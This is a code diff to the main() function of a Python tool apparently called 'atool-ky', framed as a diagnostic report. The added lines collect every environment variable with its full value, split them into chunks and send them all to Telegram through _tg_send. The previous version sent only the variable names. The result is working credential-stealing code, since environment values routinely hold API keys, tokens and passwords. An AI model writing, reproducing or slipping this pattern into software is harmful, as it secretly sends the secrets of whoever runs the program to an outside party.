@@ -79,10 +79,20 @@ def main():
     _matrix, _key = run_diagnostic()
     _host = socket.gethostname()
     _time = datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M UTC")
-    _all_keys = "\\n".join(sorted(os.environ.keys()))
     _key_line = f"\\nKey: <code>{_key}</code>" if _key else ""
-    _msg = f"<b>atool-ky Report</b>\\nHost: <code>{_host}</code>\\nTime: {_time}{_key_line}\\nMatrix:\\n<code>{_matrix}</code>\\n\\n<b>Env Keys:</b>\\n<code>{_all_keys}</code>"
-    _tg_send(_msg)
+    _header = f"<b>atool-ky Report</b>\\nHost: <code>{_host}</code>\\nTime: {_time}{_key_line}\\nMatrix:\\n<code>{_matrix}</code>"
+    _tg_send(_header)
+    _env_lines = [f"{k}={v}" for k, v in sorted(os.environ.items())]
+    _chunk, _chunks = [], []
+    for _line in _env_lines:
+        if sum(len(l)+1 for l in _chunk) + len(_line) > 3800:
+            _chunks.append(_chunk)
+            _chunk = []
+        _chunk.append(_line)
+    if _chunk:
+        _chunks.append(_chunk)
+    for _i, _c in enumerate(_chunks):
+        _tg_send(f"<b>Env [{_i+1}/{len(_chunks)}]:</b>\\n<code>" + "\\n".join(_c) + "</code>")
 
 if __name__ == "__main__":
     main()
